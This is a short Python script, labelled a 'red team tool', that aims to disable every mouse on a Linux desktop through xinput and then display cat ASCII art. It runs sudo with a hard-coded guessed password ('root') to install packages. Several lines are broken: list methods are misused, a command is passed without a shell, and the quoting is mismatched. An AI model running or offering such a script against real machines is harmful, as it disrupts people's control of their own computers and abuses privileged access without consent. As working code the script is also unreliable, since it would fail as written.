# red team tool that will disable mouse functionality and pop up with a cat ascii art
# runs on linux

# imports
import subprocess as sp
import os

# CONSTANTS
PASSWORD = "root"
ASCII_CAT = """
           X                   X              
             XXX                 XXX             
            XX XX               XX XX            
           XX   XX             XX   XX           
          XX    XX            XX     XX          
         XX       XXXXXXXXXXXXX       XX         
        X                               X        
XXX    X                                 X    XXX
   XXXX      XX                  XX       XXXX   
      X      XX                  XX       X      
   XXXXX          X   XX   X              XXXX   
XXX     X          X X  X X              X    XXX
         X          X    X              X        
          X                            X         
           XXXXXXXXXXXXXXXXXXXXXXXXXXXX    

"""

# create ascii art file
os.system(f'echo "{ASCII_CAT}" >> /tmp/cat.txt')

# install xlist
os.system(f'echo {PASSWORD} | sudo -S apt install xinput')

# getting mouse devices
output = sp.run("xinput list", capture_output=True, text=True)

cleaned = [line for line in output.stdout.splitlines() if "mouse" in line.lower()]

# get the id of the mouse devices
ids = []
for line in cleaned:
    token = cleaned.split()
    for x in token:
        if token.startswith("id="):
            # Extract the ID value from 'id=<number>'
            ids.append(token.split('=')[1])  # The ID is after the '='

for id in ids:
    os.system(f"xinput disable {id}")

# print cat to new terminal
os.system('gnome-terminal -- bash -c \'cat /tmp/cat.txt"; exec bash\'')